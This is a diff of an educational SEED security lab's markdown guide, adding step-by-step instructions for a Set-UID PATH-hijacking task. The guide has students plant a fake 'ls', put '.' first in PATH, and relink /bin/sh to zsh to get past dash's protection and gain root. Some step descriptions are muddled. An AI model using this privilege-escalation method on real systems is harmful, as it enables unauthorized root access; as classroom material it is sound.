@@ -24,6 +24,13 @@ In this lab, students will understand how environment variables work, how they a
 
 ## 2 Lab Tasks
 
+First you need to make sure that you are logged in to **seed** user. Type the below commmands to log in as seed user and change directory.
+```
+sudo su seed
+cd
+```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/6252c5b5-7bd6-4fd7-b995-4dc0d7cbd62c)
+
 Files needed for this lab are included in `Labsetup.zip`, which can be downloaded into the VM by running the following commands in the terminal.
  
 ```
@@ -247,15 +254,268 @@ int main()
 }
 ```
 
-Please compile the above program, change its owner to root, and make it a `Set-UID` program. Can you get this `Set-UID` program to run your own malicious code, instead of `/bin/ls` ? If you can, is your malicious code running with the root privilege? Describe and explain your observations.
+**Step 1**. Create a file using the below command, which will list out all the files and folders in the calendar folder with root privileges.
 
-> **Note**: The `system(cmd)` function executes the `/bin/sh` program first, and then asks this shell program to run the cmd command. In Ubuntu 20.04 (and several versions before), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`. This shell program has a countermeasure that prevents itself from being executed in a `Set-UID` process. Basically, if dash detects that it is executed in a `Set-UID` process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping the privilege. 
+```
+$ sudo nano ls.c
+```
 
-Since our victim program is a `Set-UID` program, the countermeasure in `/bin/dash` can prevent our attack. To see how our attack works without such a countermeasure, we will link `/bin/sh` to another shell that does not have such a countermeasure. We have installed a shell program calledzshin our Ubuntu 20.04 VM. We use the following commands to link `/bin/shto/bin/zsh:`
+**Step 2**. Upon the opening of the nano editor , copy and paste the below provided program in the editor.
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+	printf("My malicious ls program is called!\n");
+    system("/bin/zsh");
+	return 0;
+}
+```
+
+![Copy Paste ls.c program in Nano editor](./media/task6-step2-lsc-file-nano-editor.png)
+
+
+**Step 3**.  To save the file, press **Ctrl + O**, press **Enter** to confirm the write action, and exit the nano editor by pressing **Ctrl+X**.
+
+**Step 4**. Create another file using the below command, which will list out all the files and folders in the calendar folder.
+
+```
+$ sudo nano myls.c
+```
+
+**Step 5**. Copy and paste the below provided program in the editor once it launches.
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+    system("/bin/ls");
+    return 0;
+}
+```
+
+![Copy Paste myls.c program in Nano editor](./media/task6-step5-mylsc-file-nano-editor.png)
+
+**Step 6**.  Next, save the file by pressing **Ctrl + O**, press **Enter** to confirm the write action, and press **Ctrl+X** to exit the nano editor.
+
+**Step 7**. Compile and run the **myls.c** file using the below commands. You can see that running the binary file will output the files in the current folder. Additionally, you can see the color highlighted file with elevated privilege (Set-UID program) using the ls **command**.
+
+```
+$ sudo gcc myls.c -o myls
+$ ./myls
+$ ls
+```
+
+![Compile and run myls.c](./media/task6-step7-compile-run-mylsc.png)
+
+>**Note:** The reason **ls** command lists files along with highlighted colors, but running the **myls.c** program which contains **bin/ls** path doesn't list files in the same way is that, there are 2 **ls** in the system. **ls** relies on the system's command lookup (Environemnt Variables), while **/bin/ls** specifies the exact location in the /bin directory.
+
+**Step 8**. Run the below command to check the exact path of the **ls** command's executable.
+
+```
+$ which ls
+```
+
+![Display ls path](./media/task6-step8-which-ls.png)
+
+**Step 9**. Now, list the files in the current path using the path displayed in the previous step, by running the commands below.
+
+```
+$ /usr/bin/ls
+$ /bin/ls
+```
+
+![Display usr/bin path](./media/task6-step9-usr-bin-path-list.png)
+
+**Step 10**. The reason **which ls** command displays **/usr/bin/ls** is because, the system will search for the files and folders in the pairs in one of the environment variable. By running the below command, you will be able to observe that **/usr/bin** folder is front of the **/bin folder**. Therefore, it will call /usr/bin/ls. 
+
+```
+$ echo $PATH
+```
+
+![Display Path pair](./media/task6-step10-list-path-pair.png)
+
+**Step 11**. You can manipulate the **$PATH** environment variable as normal user by executing the below commands, that will search the local paths before any folder and displays the new path. Post the below commands are executed, you will notice **.** in the beginning of the path. 
+
+```
+$ export PATH='.':$PATH
+$ echo $PATH
+```
+
+![Display the update path environment variable](./media/task6-step11-updated-path-env-var.png)
+
+**Step 12**. The next step is to make a fake **ls** by running the below commands. Post the commands execution, you will notice that running **ls** will open the calendar folder, as **cal** is indicative of the term "calendar".
+
+```
+$ sudo cp /bin/cal ls
+$ ls
+```
+
+![Display Fale ls calendar](./media/task6-step12-fake-ls-calendar.png)
+
+**Step 13**. Even if you run **./myls**, it will display the files in **/bin/ls**. Verify it by running the below command. You will see that files are not colour highlighted.
+
+```
+$ ./myls
+```
+
+**Step 14**. In your current Terminal tab, the batch process and exporters are password manipulated at a path. Hence, open a new tab in the Terminal which will be normal (unmanipulated), by clicking on **File** ***(1)***, then select **New Tab** ***(2)***. 
+
+![New terminal tab](./media/task6-step14-new-terminal-tab.png)
+
+> **Note:** Once the new tab opens, check if the username the terminal is logged into is **seed**. Else, run the command `sudo su seed` to login as seed user, then execute `cd` command to return to the home directory. Lastly run 'cd Labsetup/' to go the Lab directory.
+
+**Step 15**. Check if the path is manipulated in the new tab by running the below command. You will notice that the path is not manipulated.
+
+```
+$ echo $PATH
+```
+
+![Echo PATH new tab](./media/task6-step-15-echo-path-new-tab.png)
+
+**Step 16**. In the new tab, run the below commands. You will notice that running **ls** will list the files as usual, whereas, executing **./ls** will return the calendar, as ./ls is fake.
+
+```
+$ ls
+$ ./ls
+```
+
+![Output ls and fake ./ls](./media/task6-step-16-print-fake-ls-files.png)
+
+**Step 17**. In the new tab you created, run the below commands to change the noral **myls** program to a Set-UID program. 
+
+```
+$ sudo chown root myls
+$ sudo chmod 4755 myls
+$ ls -l myls
+```
+
+![Update myls to set-UID program](./media/task6-step-17-update-myls-setuid.png)
+
+**Step 18**. Return to the previous tab (manipulated tab) and run the commands below to check if it will search for myls file. 
+
+```
+$ ./myls
+$ echo $PATH
+```
+
+![Check myls path](./media/task6-step-18-myls-path-check.png)
+
+**Step 19**. The reason it doesn't return the set-UID program is that, in the **myls.c** file, you had provided **/bin/ls** path instead of **ls**. Therefore open **myls** file using the below command to modify the file.
+
+```
+$ sudo nano myls.c
+```
+
+**Step 20**. Update the path in the file from **/bin/ls** to **ls**.
+
+![Update myls file](./media/task6-step20-update-myls-file.png)
+
+**Step 21**. Upon updating the file, save the file by pressing **Ctrl + O**, press **Enter** to confirm the write action, and press **Ctrl+X** to exit the nano editor.
+
+**Step 22**. Now, switch to the new tab (Unmanipulated). Compile and run the updated **myls.c** file by executing the below commands. You will observe that in the normal folder, the path environment variable is not modified.
+
+```
+$ sudo gcc myls.c -o myls2
+$ ./myls2
+```
+
+![Compile & run updated myls.c file](./media/task6-step22-compile-run-updated-myls.png)
+
+**Step 23**. Return to the previous tab (Manipulated), and run the following command. You shall see that the command will return fake ls first because it will search in local folders first to find **ls**.
+
+```
+$ ./myls2
+```
+
+![Print ./myls2 path](./media/task6-step23-print-myls-in-manipulated.png)
+
+
+**Step 24**. If the file is a normal user program it will be attacked. So, switch to the new tab you created(Unmanipulated) and update the file to be a Set-UID program by running the following commands.
+
+```
+$ sudo chown root myls2
+$ sudo chmod 4755 myls2
+$ ls -l myls2
+```
+
+![Update myls2 to set-UID program](./media/task6-step24-myls2-setuid-program.png)
+
+**Step 25**. Switch to the previous tab (Manipulated) and run the below command, which will return the calendar, as the program that was run was a Set-UID program and it accepts the manipulated PATH environment variable. This way, vulnerabiity will be introduced into the program.
+
+```
+$ ./myls2
+```
+
+![Print ./myls2 path](./media/task6-step25-print-myls-in-manipulated.png)
+
+**Step 26**. Next, you need to verify if your malicious code is running with root privilege. You can use the **id** program to check if the process is privileged or not. Go to the new tab (Unmanipulated) and run the below mentioned command, which will display many process IDs.
+
+```
+$ id
+```
+
+![Print process IDs](./media/task6-step26-process-id-show.png
+)
+
+**Step 27**. Execute the below provided commands to use the **id** program as fake ls, by firstly removing the calendar fake ls.
+ 
+```
+$ sudo rm ls
+$ sudo cp /bin/id ls
+$ ls
+$ ./ls
+```
+
+![Create ID fake ls](./media/task6-step27-create-id-fake-ls.png)
+
+**Step 28**. Switch back to the previous tab (Manipulated) and run the below command which is a Set-UID program. You will see the IDs again, since it is still running the malicious code as a normal user (non-root) due to the protection provided by the operating system.  
+
+```
+$ ./myls2
+```
+
+![Verify code privilege](./media/task6-step28-verify-code-privilege.png)
+
+**Step 29**. The protection is introduced into the **dash**. Whereas, if you use another shell like zsh, then you will see that the protection is not enabled and you will be able to run the code with root privilege. Switch to the new tab (Unmanipulated) and run the following commands which will change the **/bin/sh** to  **/bin/zsh** and also link it to the z shell instead of **dash**.
 
 ```
 $ sudo ln -sf /bin/zsh /bin/sh
+$ ls -l /bin/sh
 ```
+
+![Change sh](./media/task6-step29-change-sh.png)
+
+**Step 30**. Go back to the previous tab (Manipulated) and run the command below that will list the process ID **eudi=0(root)**, which indicates that you are able to run the program with root privilege. 
+
+```
+$ ./myls2
+```
+
+![Validate myls2 program privilege](./media/task6-step30-Validate-program-privilege.png)
+
+**Step 31**. Now, you need to link it back to the **dash** which will enable the protection again. Switch the new tab (unmanipulated) and run the below command.
+
+```
+$ sudo ln -sf /bin/dash /bin/sh
+$ ls -l /bin/sh
+```
+
+![Switch back to dash](./media/task6-step31-switch-back-dash.png)
+
+**Step 32**. Verify if the program will be executed with root privilege by running the below command in the previous tab (Manipulated). You will notice that the process ID **eudi=0(root)** which indicates that you are running the program with root privilege is not present. Therefore, it confirms that the program is executed with non-root (normal) privilege.
+
+```
+$ ./myls2
+```
+
+![Validate myls2 program dash privilege](./media/task6-step32-Validate-myls2-program-dash-privilege.png)
+
+
+> **Note**: The `system(cmd)` function executes the `/bin/sh` program first, and then asks this shell program to run the cmd command. In Ubuntu 20.04 (and several versions before), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`. This shell program has a countermeasure that prevents itself from being executed in a `Set-UID` process. Basically, if dash detects that it is executed in a `Set-UID` process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping the privilege. 
+
 
 ### 2.7 Task 7: The LD_PRELOAD Environment Variable and Set-UID Programs
 
